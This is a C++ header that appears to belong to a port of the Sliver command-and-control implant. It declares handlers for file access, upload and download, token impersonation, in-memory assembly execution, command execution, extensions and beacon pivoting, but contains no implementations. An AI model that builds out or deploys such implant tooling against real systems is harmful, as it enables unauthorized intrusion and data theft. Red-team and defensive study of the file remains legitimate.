#pragma once
#include <string>
#include "sliver.pb.h"
#include "Beacon.h"
#include "Connection.h"

using namespace std;
using namespace transports;

namespace handlers {
	typedef sliverpb::Envelope (*handler) (int64_t taskID,string taskData);
	typedef sliverpb::Envelope(*pivotHandler) (sliverpb::Envelope, shared_ptr<Connection> c);
	typedef sliverpb::Envelope(*beaconPivotHandler) (sliverpb::Envelope, shared_ptr<Beacon> b);



	//system handlers
	map<int,handler>& getSystemHandlers();
	sliverpb::Envelope pwdHandler(int64_t,string);
	sliverpb::Envelope lsHandler(int64_t, string);
	sliverpb::Envelope cdHandler(int64_t, string);
	sliverpb::Envelope uploadHandler(int64_t, string);
	sliverpb::Envelope downloadHandler(int64_t, string);
	sliverpb::Envelope mkdirHandler(int64_t, string);
	sliverpb::Envelope rmHandler(int64_t, string);
	sliverpb::Envelope makeTokenHandler(int64_t, string);
	sliverpb::Envelope revToSelfHandler(int64_t, string);
	sliverpb::Envelope executeAssemblyHandler(int64_t, string);
	sliverpb::Envelope registerExtensionHandler(int64_t, string);
	sliverpb::Envelope callExtensionHandler(int64_t, string);
	sliverpb::Envelope listExtensionHandler(int64_t, string);
	sliverpb::Envelope executeHandler(int64_t, string);

	//pivot handlers
	//map<int, pivotHandler>& getPivotHandlers();
	/*sliverpb::Envelope pivotStartListenerHandler(sliverpb::Envelope, shared_ptr<Connection>);
	sliverpb::Envelope pivotPeerEnvelopeHandler(sliverpb::Envelope, shared_ptr<Connection>);*/

	//beaconPivotHandlers
	map<int, beaconPivotHandler>& getBeaconPivotHandlers();
	sliverpb::Envelope beaconPivotStartListenerHandler(sliverpb::Envelope, shared_ptr<Beacon>);
	sliverpb::Envelope beaconPivotStopListenerHandler(sliverpb::Envelope, shared_ptr<Beacon>);
	sliverpb::Envelope beaconListenersHandler(sliverpb::Envelope, shared_ptr<Beacon>);
	sliverpb::Envelope beaconPivotPeerEnvelopeHandler(sliverpb::Envelope, shared_ptr<Beacon>);
	vector<sliverpb::Envelope> collectPivotEnvelopes();
}